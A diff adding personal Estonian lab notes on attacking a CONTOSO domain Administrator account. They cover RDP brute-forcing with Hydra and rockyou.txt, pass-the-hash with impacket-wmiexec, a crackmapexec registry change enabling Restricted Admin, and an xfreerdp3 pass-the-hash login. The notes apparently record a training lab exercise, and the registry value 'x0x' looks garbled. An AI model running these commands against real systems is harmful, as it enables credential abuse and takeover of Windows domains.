@@ -182,4 +182,38 @@ Eesmärk on leida CONTOSO domeeni Administrator kasutaja LTMN võtit!
 ********************************************************************
 ***************** c625e3e2756d9ef01881fa7ed46b49a8 *****************
 ********************************************************************
+***** CrackStation.net **** sai sellest hash käsust jagu ***********
+****************************NTLM************stars4191* *************
+********************************************************************
+**********aga se oli praegu vale tee.. peab ootama programmi********
+********************************************************************
+KALI masinas
+
+veendume, et meil on Dokumentides rockyou.txt fail nii zip kui ka lahti pakitud, sest mõni programm vajab ka zipi..
+
+seejärel teises terminalis:
+
+hydra -V -f -l Administrator -P /home/heiki/Documents/rockyou.txt rdp://192.168.1.2
+
+uus terminal:
+/usr/bin/impacket-wmiexec -hashes :c625e3e2756d9ef01881fa7ed46b49a8 contoso/Administrator@192.168.1.2
+
+hostname
+whoami
+whoami /groups
+ctrl+c -väljume sellest
+
+crackmapexec smb 192.168.1.2 -u "Administrator" -H "c625e3e2756d9ef01881fa7ed46b49a8" -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d x0x /f'
+
+kontrollime seda kas se ka tegelikult läbi läks, ehk siis kustutame sellest eelnevast sisestusest mõned kohad ja muudame *add* *query'ks*
+
+crackmapexec smb 192.168.1.2 -u "Administrator" -H "c625e3e2756d9ef01881fa7ed46b49a8" -x 'reg query HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin'
+
+sudo xfreerdp3 /v:192.168.1.2 /u:Administrator /d:contoso /pth:c625e3e2756d9ef01881fa7ed46b49a8 /restricted-admin
+küsib meie parooli ja voilaa siseneb serverisse
+
+
+
+
+
 
